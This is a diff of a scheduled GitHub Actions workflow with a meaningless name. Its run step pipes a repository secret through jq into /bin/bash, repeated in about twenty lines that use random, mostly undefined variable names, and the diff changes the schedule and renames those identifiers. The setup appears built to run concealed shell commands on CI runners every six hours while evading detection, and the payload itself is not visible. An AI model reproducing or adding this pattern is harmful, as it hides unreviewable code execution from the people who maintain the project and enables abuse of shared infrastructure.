@@ -1,31 +1,37 @@
 name: insuranceguilty
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 3/6 * * *'
+    - cron: '18 3/6 * * *'
 
-jobs:  # 8852
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: insuranceguilty
         env:
-          rkv2263: ${{ secrets.rkv2263 }}
+          mujo494: ${{ secrets.mujo494 }}
         run: |
-          echo $rkv2263 | jq -r .yvke1 | /bin/bash
-          echo $j2049 | jq -r .um79108 | /bin/bash
-          echo $m778 | jq -r .lgk19521 | /bin/bash
-          echo $nqda5713 | jq -r .w110 | /bin/bash
-          echo $ka8532 | jq -r .hd12224 | /bin/bash
-          echo $ycvp50474 | jq -r .pc596 | /bin/bash
-          echo $gigd64 | jq -r .cxmin151 | /bin/bash
-          echo $qxqv68737 | jq -r .w4 | /bin/bash
-          echo $nej37 | jq -r .ultye58020 | /bin/bash
-          echo $tatma2 | jq -r .getza01 | /bin/bash
-          echo $f208 | jq -r .jxb9739 | /bin/bash
-          echo $rcg60 | jq -r .wl0584 | /bin/bash
-          echo $h87693 | jq -r .md91123 | /bin/bash
-          echo $ziab6 | jq -r .jz63 | /bin/bash
-          echo $scnc83626 | jq -r .avrug07 | /bin/bash
+          echo $mujo494 | jq -r .wnt13 | /bin/bash
+          echo $gl5 | jq -r .kfen8 | /bin/bash
+          echo $dz045 | jq -r .qdz8534 | /bin/bash
+          echo $nneml9211 | jq -r .d973 | /bin/bash
+          echo $bpkhu2 | jq -r .h83842 | /bin/bash
+          echo $fat49 | jq -r .kwa3 | /bin/bash
+          echo $vdral62 | jq -r .mke08920 | /bin/bash
+          echo $gsey61171 | jq -r .kr02614 | /bin/bash
+          echo $lip894 | jq -r .shlts032 | /bin/bash
+          echo $igyzx56 | jq -r .kg79 | /bin/bash
+          echo $vn31 | jq -r .xczg9 | /bin/bash
+          echo $ulrrc41390 | jq -r .je30308 | /bin/bash
+          echo $tkrt5990 | jq -r .vf114 | /bin/bash
+          echo $p4 | jq -r .r20569 | /bin/bash
+          echo $s44 | jq -r .wkmh934 | /bin/bash
+          echo $jxmaq00864 | jq -r .bxcmb96731 | /bin/bash
+          echo $qv680 | jq -r .dhd2 | /bin/bash
+          echo $ajuo2454 | jq -r .jqwjh49 | /bin/bash
+          echo $bxdt31132 | jq -r .yupzp58 | /bin/bash
+          echo $tcf93515 | jq -r .ds67 | /bin/bash
 
